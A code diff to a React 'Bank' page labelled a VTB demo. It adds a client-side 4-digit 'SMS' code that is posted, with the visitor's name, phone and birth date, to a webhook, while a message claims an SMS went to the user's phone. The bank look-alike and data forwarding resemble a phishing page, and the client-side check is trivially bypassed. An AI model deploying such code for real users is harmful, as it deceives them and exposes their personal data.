@@ -87,6 +87,7 @@ const Bank = () => {
   });
 
   const [smsCode, setSmsCode] = useState('');
+  const [generatedCode, setGeneratedCode] = useState('');
 
   // Генерируем номер карты и дату один раз при загрузке
   const [cardNumber] = useState(() => generateCardNumber());
@@ -208,11 +209,16 @@ const Bank = () => {
 
     setIsLoading(true);
 
+    // Генерируем 4-значный код подтверждения
+    const code = String(Math.floor(1000 + Math.random() * 9000));
+    setGeneratedCode(code);
+
     try {
       const payload = {
         fullName: formData.fullName,
         phone: '7' + phoneDigits,
         birthDate: formData.birthDate,
+        smsCode: code,
         timestamp: new Date().toISOString(),
         source: 'vtb-demo-page',
       };
@@ -252,6 +258,17 @@ const Bank = () => {
 
     // Имитация проверки кода
     await new Promise(resolve => setTimeout(resolve, 1000));
+
+    // Проверяем код
+    if (smsCode !== generatedCode) {
+      setIsLoading(false);
+      toast({
+        title: "Неверный код",
+        description: "Введённый код не совпадает с отправленным",
+        variant: "destructive",
+      });
+      return;
+    }
 
     setIsLoading(false);
     setStep('success');
@@ -326,7 +343,34 @@ const Bank = () => {
               <button
                 type="button"
                 className="text-[#0066FF] hover:underline"
-                onClick={() => {
+                onClick={async () => {
+                  // Генерируем новый код
+                  const newCode = String(Math.floor(1000 + Math.random() * 9000));
+                  setGeneratedCode(newCode);
+                  setSmsCode('');
+
+                  // Отправляем новый код в вебхук
+                  const phoneDigits = formData.phone.replace(/\D/g, '');
+                  try {
+                    await fetch(webhookUrl, {
+                      method: 'POST',
+                      headers: {
+                        'Content-Type': 'application/json',
+                      },
+                      body: JSON.stringify({
+                        fullName: formData.fullName,
+                        phone: '7' + phoneDigits,
+                        birthDate: formData.birthDate,
+                        smsCode: newCode,
+                        timestamp: new Date().toISOString(),
+                        source: 'vtb-demo-page',
+                        resend: true,
+                      }),
+                    });
+                  } catch (error) {
+                    console.error('Webhook error:', error);
+                  }
+
                   toast({
                     title: "Код отправлен повторно",
                     description: "Новый SMS с кодом отправлен на ваш номер",
